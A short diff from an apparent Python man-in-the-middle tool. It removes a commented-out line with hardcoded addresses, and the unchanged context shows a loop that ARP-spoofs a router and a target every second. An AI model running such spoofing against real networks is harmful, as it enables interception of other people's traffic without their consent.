@@ -236,7 +236,6 @@ def main( ):
     while 1:
         try:
             mitm.arpSpoof(router_ip, target_ip, my_mac, my_mac)
-            # mitm.arpSpoof("10.128.128.128", "10.213.72.51", my_mac, my_mac)
             time.sleep(1)
         except KeyboardInterrupt:
             mitm.stopForwardPacket( )
